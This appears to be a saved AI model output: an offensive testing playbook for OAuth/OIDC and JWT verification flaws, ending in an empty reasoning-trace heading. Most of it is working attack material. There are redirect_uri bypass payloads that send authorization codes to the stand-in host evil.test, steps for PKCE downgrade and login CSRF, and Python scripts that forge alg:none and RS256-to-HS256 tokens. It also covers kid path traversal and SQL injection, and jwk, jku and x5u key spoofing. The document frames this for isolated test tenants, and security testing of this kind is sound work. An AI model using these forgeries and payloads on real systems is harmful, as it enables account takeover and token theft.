# mimo-v2.6-flash — oauth-jwt
# SOURCE: upstream-2 (mimo-v2.6-pro), prompt: mimo-2.6-agents.md, non-streaming

Use isolated test tenants and controlled domains: `client.test`, `idp.test`, `evil.test`. Proof requires observable unauthorized login, code/token disclosure, or forged-token acceptance—not scanner output alone.

## OAuth/OIDC redirect handling

### `redirect_uri` path traversal

Registered URI:

```text
https://client.test/oauth/callback
```

Authorization request:

```http
GET /authorize?response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https%3A%2F%2Fclient.test%2Foauth%2Fcallback%2F..%2F..%2Fopen-redirect%3Furl%3Dhttps%253A%252F%252Fevil.test%252Fcollect
  &scope=openid
  &state=S1
  &nonce=N1 HTTP/1.1
Host: idp.test
```

After login, vulnerable chain:

```http
HTTP/1.1 302 Found
Location: https://client.test/oauth/callback/../../open-redirect?url=https%3A%2F%2Fevil.test%2Fcollect&code=CODE&state=S1
```

Client normalization/open redirect sends code to:

```http
GET /collect?code=CODE&state=S1 HTTP/1.1
Host: evil.test
```

Proof: `evil.test` receives usable authorization code. Secure result: authorization server rejects request with `invalid_request` because URI lacks exact registered match.

### Weak regex or prefix matching

Common bad validation:

```regex
^https://client\.test
```

Payloads:

```text
https://client.test.evil.test/callback
https://client.test@evil.test/callback
https://client.test%2eevil.test/callback
https://client.test.evil.test/oauth/callback
```

Request:

```http
GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https%3A%2F%2Fclient.test.evil.test%2Fcallback&scope=openid&state=S1 HTTP/1.1
Host: idp.test
```

Vulnerable response:

```http
HTTP/1.1 302 Found
Location: https://client.test.evil.test/callback?code=CODE&state=S1
```

Proof: controlled host receives `CODE`.

### Subdomain takeover of registered redirect host

Registered URI:

```text
https://oauth-old.client.test/callback
```

DNS:

```text
oauth-old.client.test CNAME abandoned-service.example-host.net
```

Check ownership state:

```bash
dig +short CNAME oauth-old.client.test
curl -i https://oauth-old.client.test/
```

Claim only controlled test resource matching dangling target, then request:

```http
GET /authorize?response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https%3A%2F%2Foauth-old.client.test%2Fcallback
  &scope=openid
  &state=S1 HTTP/1.1
Host: idp.test
```

Proof:

```http
GET /callback?code=CODE&state=S1 HTTP/1.1
Host: oauth-old.client.test
```

Controlled takeover endpoint logs code.

## Missing `state`: login CSRF/account swapping

1. Tester starts authorization while authenticated to attacker test account:

```http
GET /authorize?response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=https%3A%2F%2Fclient.test%2Foauth%2Fcallback
  &scope=openid HTTP/1.1
Host: idp.test
Cookie: attacker_session=...
```

2. Stop before callback consumption; capture:

```text
https://client.test/oauth/callback?code=ATTACKER_CODE
```

3. Victim browser visits captured callback:

```http
GET /oauth/callback?code=ATTACKER_CODE HTTP/1.1
Host: client.test
Cookie: victim_client_session=...
```

4. Vulnerable client exchanges code:

```http
POST /token HTTP/1.1
Host: idp.test
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=ATTACKER_CODE&redirect_uri=https%3A%2F%2Fclient.test%2Foauth%2Fcallback&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
```

Proof: victim’s client session becomes linked to attacker’s IdP identity. Secure result: callback rejected because session-bound `state` is absent or mismatched.

## PKCE downgrade

### Authorization server allows omitted challenge

Start code flow without PKCE:

```http
GET /authorize?response_type=code
  &client_id=PUBLIC_CLIENT_ID
  &redirect_uri=com.example.app%3A%2F%2Fcallback
  &scope=openid
  &state=S1 HTTP/1.1
Host: idp.test
```

Capture redirected code, then redeem without verifier:

```bash
curl -i https://idp.test/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=authorization_code' \
  --data-urlencode 'client_id=PUBLIC_CLIENT_ID' \
  --data-urlencode 'redirect_uri=com.example.app://callback' \
  --data-urlencode 'code=CAPTURED_CODE'
```

Proof: token endpoint returns tokens without `code_verifier`.

### `S256` challenge downgraded or ignored

Create values:

```bash
VERIFIER='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._~'
CHALLENGE="$(
  printf %s "$VERIFIER" |
  openssl dgst -sha256 -binary |
  openssl base64 -A |
  tr '+/' '-_' |
  tr -d '='
)"
```

Authorization:

```text
/authorize?response_type=code&client_id=PUBLIC_CLIENT_ID&redirect_uri=com.example.app%3A%2F%2Fcallback&code_challenge=CHALLENGE&code_challenge_method=S256
```

Redeem using wrong or omitted verifier:

```bash
curl -i https://idp.test/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=authorization_code' \
  --data-urlencode 'client_id=PUBLIC_CLIENT_ID' \
  --data-urlencode 'redirect_uri=com.example.app://callback' \
  --data-urlencode 'code=CODE' \
  --data-urlencode 'code_verifier=WRONG'
```

Proof: tokens returned despite wrong verifier. Secure result: `invalid_grant`.

## Authorization-code leak through `Referer`

Callback exposes code in query:

```http
GET /oauth/callback?code=CODE&state=S1 HTTP/1.1
Host: client.test
```

Callback page loads attacker-controlled or observable resource:

```html
<img src="https://evil.test/pixel">
```

Browser request:

```http
GET /pixel HTTP/1.1
Host: evil.test
Referer: https://client.test/oauth/callback?code=CODE&state=S1
```

Minimal collector:

```bash
python3 -m http.server 8443
```

Proof: collector log or proxy capture contains `code=CODE`. Result depends on `Referrer-Policy`, browser behavior, HTTPS transitions, and callback navigation timing.

Expected protection:

```http
Referrer-Policy: no-referrer
Cache-Control: no-store
```

Callback should exchange code immediately, then redirect to clean URL without query data.

## IdP mix-up

Clients supporting multiple issuers must bind authorization response to initiating issuer.

Actors:

```text
Honest issuer: https://honest-idp.test
Other/attacker-controlled test issuer: https://other-idp.test
Client callback: https://client.test/callback
```

1. Start client session intending `honest-idp.test`:

```http
GET /login?provider=honest HTTP/1.1
Host: client.test
```

2. Cause authorization response originating from other issuer to reach same callback:

```http
GET /callback?code=OTHER_IDP_CODE&state=SESSION_STATE HTTP/1.1
Host: client.test
```

3. Vulnerable client selects token endpoint from response-controlled/provider-confused state:

```http
POST /token HTTP/1.1
Host: other-idp.test
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=OTHER_IDP_CODE&client_id=CLIENT_ID&client_secret=CLIENT_SECRET&redirect_uri=https%3A%2F%2Fclient.test%2Fcallback
```

Proof signals:

- Client sends code or credentials to wrong issuer.
- Client accepts ID token whose `iss` differs from issuer selected when login began.
- Client accepts response lacking expected RFC 9207 `iss` parameter where issuer identification is required.

Secure checks:

```text
callback issuer == session-bound initiating issuer
authorization-response iss == expected issuer
ID-token iss == expected issuer
token endpoint == endpoint from expected issuer metadata
client_id/aud == expected client registration
```

## JWT `alg: none`

Create unsigned token:

```python
import base64, json, time

def b64(x):
    raw = json.dumps(x, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {
    "sub": "admin-test",
    "role": "admin",
    "iss": "https://idp.test",
    "aud": "api-test",
    "exp": int(time.time()) + 3600,
}
print(f"{b64(header)}.{b64(payload)}.")
```

Send:

```bash
TOKEN="$(python3 make_none.py)"
curl -i https://api.test/admin \
  -H "Authorization: Bearer $TOKEN"
```

Proof: protected endpoint accepts token. Secure result: `401`; verifier pins allowed algorithm and requires signature.

## RS256-to-HS256 confusion

Condition: verifier trusts token `alg` and uses RSA public-key bytes as HMAC secret.

Obtain public key:

```bash
curl -s https://idp.test/.well-known/jwks.json
```

Save verifier’s exact public-key representation as `public.pem`, then forge:

```python
import base64, hashlib, hmac, json, time

def b64raw(x):
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

header = b64raw(json.dumps(
    {"alg": "HS256", "typ": "JWT", "kid": "test-rsa"},
    separators=(",", ":")
).encode())

payload = b64raw(json.dumps({
    "sub": "admin-test",
    "role": "admin",
    "iss": "https://idp.test",
    "aud": "api-test",
    "exp": int(time.time()) + 3600
}, separators=(",", ":")).encode())

message = f"{header}.{payload}".encode()
key = open("public.pem", "rb").read()
signature = b64raw(hmac.new(key, message, hashlib.sha256).digest())
print(f"{header}.{payload}.{signature}")
```

Test:

```bash
curl -i https://api.test/admin \
  -H "Authorization: Bearer $(python3 forge.py)"
```

Proof: forged `HS256` token accepted where issuer specifies `RS256`. Exact public-key serialization must match bytes misused by target.

## `kid` path traversal

Condition: verifier loads key using concatenation such as:

```text
"/keys/" + header.kid
```

Probe token headers:

```json
{"alg":"HS256","kid":"../../../../dev/null"}
```

```json
{"alg":"HS256","kid":"../../../../tmp/test-key"}
```

Place controlled key only in isolated environment:

```bash
printf 'known-test-secret' >/tmp/test-key
```

Sign using its contents:

```python
# Same HMAC construction as above:
key = b"known-test-secret"
header = {"alg":"HS256","kid":"../../../../tmp/test-key","typ":"JWT"}
```

Proof: token signed with `/tmp/test-key` content is accepted. `/dev/null` variants may work only when library permits empty HMAC keys; not reliable.

## `kid` SQL injection

Condition: key lookup resembles:

```sql
SELECT key FROM jwt_keys WHERE kid = '<header kid>'
```

Initial error probe:

```json
{"alg":"HS256","kid":"'"}
```

Controlled test-row selection payload:

```json
{"alg":"HS256","kid":"' UNION SELECT 'known-test-secret'-- "}
```

Sign token with:

```text
known-test-secret
```

Proof: forged token accepted or DB trace shows injected query returning controlled key material. Exact payload depends on DB dialect and parameter count. Parameterized lookup should return no key, not a SQL error.

## Embedded `jwk` spoofing

Generate test key and JWKS:

```bash
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out attacker.key
openssl rsa -in attacker.key -pubout -out attacker.pub
```

Build token header containing attacker public key:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "alg": "RS256",
    "n": "BASE64URL_MODULUS",
    "e": "AQAB"
  }
}
```

Sign with `attacker.key`, then send:

```bash
curl -i https://api.test/admin \
  -H "Authorization: Bearer $TOKEN"
```

Proof: verifier trusts embedded key without matching it to issuer-pinned JWKS.

## `jku` spoofing

Serve controlled JWKS at:

```text
https://evil.test/jwks.json
```

```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "alg": "RS256",
    "n": "BASE64URL_MODULUS",
    "e": "AQAB"
  }]
}
```

Token header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-key",
  "jku": "https://evil.test/jwks.json"
}
```

Sign with matching private key.

Proof sequence:

```http
GET /admin HTTP/1.1
Host: api.test
Authorization: Bearer ATTACKER_SIGNED_TOKEN
```

Verifier then makes:

```http
GET /jwks.json HTTP/1.1
Host: evil.test
```

Protected endpoint accepts token. Secure verifier ignores untrusted `jku` or requires exact issuer-configured JWKS URL.

## `x5u` spoofing

Create certificate:

```bash
openssl req -new -x509 \
  -key attacker.key \
  -out attacker.crt \
  -days 1 \
  -subj '/CN=jwt-test'
```

Serve:

```text
https://evil.test/attacker.crt
```

Token header:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-key",
  "x5u": "https://evil.test/attacker.crt"
}
```

Sign with `attacker.key`.

Proof: verifier fetches certificate and accepts signature without pinning certificate chain/key to expected issuer. TLS success alone does not establish token-signing trust.

## Expired-token acceptance

Generate normally signed token with past expiration:

```json
{
  "sub": "expiry-test",
  "iss": "https://idp.test",
  "aud": "api-test",
  "iat": 1760000000,
  "exp": 1760000060
}
```

Set times well outside configured clock skew, for example one hour expired:

```python
now = int(time.time())
payload["iat"] = now - 7200
payload["exp"] = now - 3600
```

Request:

```bash
curl -i https://api.test/protected \
  -H "Authorization: Bearer $EXPIRED_TOKEN"
```

Proof: endpoint returns protected content. Repeat with:

```json
{"exp":"not-a-number"}
```

and:

```json
{}
```

These are separate validation cases. Secure behavior: reject expired token; define explicit policy for missing `exp`; reject malformed NumericDate.

---

## [reasoning trace]


